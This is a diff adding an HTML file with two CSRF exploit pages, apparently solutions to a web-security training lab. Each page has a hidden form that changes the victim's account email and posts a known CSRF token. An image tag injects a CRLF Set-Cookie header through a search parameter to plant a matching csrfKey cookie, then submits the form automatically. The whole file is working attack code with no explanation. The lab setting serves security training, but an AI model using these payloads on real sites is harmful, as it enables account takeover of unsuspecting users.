@@ -1,0 +1,24 @@
+<html>
+<body>
+	<iframe name="csrf-iframe" style="display:none"></iframe>
+	<form method="post" id="csrf-form" action="https://0a1d001c04bb247c8066213c009c00df.web-security-academy.net/my-account/change-email" target="csrf-iframe">
+		<input type="hidden" name="email" value="hacker@email.com">
+        <input type="hidden" name="csrf" value="1UshZ8fsD1BmZ5LSdenYfolS0iYnaQBk">
+	</form>
+    
+    <img src="https://0a1d001c04bb247c8066213c009c00df.web-security-academy.net/?search=john_wick%0d%0aSet-Cookie:%20csrfKey=hHL5XRKSZ06yILGn8dOAut0OO5mOj6AZ%3b%20SameSite=None" onerror="document.forms[0].submit()">
+</body>
+</html>
+
+
+<html>
+    <body>
+        <h1>Hello World!</h1>
+        <form action="https://0af600d7041a876284a7454800a100f1.web-security-academy.net/my-account/change-email" method="post" id="csrf-form">
+            <input type="hidden" name="email" value="test5@test.ca">
+            <input type="hidden" name="csrf" value="GDnsLDhOZ6q0AVroSCPEKYsy7n5jLHgr">
+        </form>
+
+        <img src="https://0af600d7041a876284a7454800a100f1.web-security-academy.net/?search=john_wick%0d%0aSet-Cookie:%20csrfKey=6d2R44IgBhkqvVKiq793DcTNz4VDH3NI" onerror="document.forms[0].submit()">
+    </body>
+</html>
